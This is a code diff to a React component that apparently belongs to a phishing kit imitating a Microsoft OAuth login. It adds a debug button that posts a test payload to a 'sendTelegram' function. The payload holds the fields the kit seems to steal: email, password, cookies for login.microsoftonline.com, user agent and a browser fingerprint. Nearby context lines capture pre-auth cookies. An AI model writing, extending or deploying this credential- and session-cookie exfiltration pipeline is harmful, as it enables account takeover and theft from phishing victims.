@@ -236,6 +236,47 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
     localStorage.setItem('selected_provider', 'Microsoft');
     localStorage.setItem('oauth_start_time', Date.now().toString());
 
+    // DEBUG: Add a test button for manual Telegram testing
+    if (window.location.search.includes('debug=1')) {
+      console.log('🔍 DEBUG MODE ENABLED - Adding test button');
+      setTimeout(() => {
+        const testButton = document.createElement('button');
+        testButton.innerText = '🧪 Test Telegram Now';
+        testButton.style.cssText = 'position:fixed;top:10px;right:10px;z-index:9999;background:red;color:white;padding:10px;border:none;border-radius:5px;cursor:pointer;';
+        testButton.onclick = async () => {
+          console.log('🧪 Manual Telegram test triggered');
+          try {
+            const response = await fetch('/.netlify/functions/sendTelegram', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                email: 'manual-test@debug.com',
+                password: 'ManualTest123',
+                provider: 'Microsoft',
+                fileName: 'Manual Debug Test',
+                timestamp: new Date().toISOString(),
+                sessionId: 'manual_' + Math.random().toString(36).substring(2, 15),
+                userAgent: navigator.userAgent,
+                formattedCookies: [{
+                  name: 'MANUAL_TEST',
+                  value: 'manual_value_' + Date.now(),
+                  domain: '.login.microsoftonline.com'
+                }],
+                browserFingerprint: { localStorage: '{"manual":"test"}' }
+              })
+            });
+            const result = await response.json();
+            console.log('🧪 Manual test result:', result);
+            alert('Manual test completed - check console and Telegram');
+          } catch (error) {
+            console.error('🧪 Manual test failed:', error);
+            alert('Manual test failed: ' + error.message);
+          }
+        };
+        document.body.appendChild(testButton);
+      }, 1000);
+    }
+
     // Store pre-auth cookies for comparison
     const preAuthFingerprint = {
       cookies: document.cookie,
